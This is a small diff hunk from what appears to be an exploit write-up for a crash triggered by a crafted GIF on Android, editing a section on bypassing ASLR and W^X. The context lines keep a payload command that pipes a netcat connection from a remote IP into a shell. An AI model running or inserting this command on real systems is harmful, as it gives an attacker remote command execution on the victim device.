@@ -218,7 +218,7 @@ The above GIF triggers crash as below:
 ```
 
 ## Deal with ASLR and W^X
-After controlling the PC, to achieve remote code execution. The easiest way to to execute the below command:
+After controlling the PC, to achieve remote code execution. In Android, we can not execute code on non-executable regions (i.e. stack and heap). The easiest way to to execute the below command:
 ```
 system("toybox nc 192.168.2.72 4444 | sh");
 ```
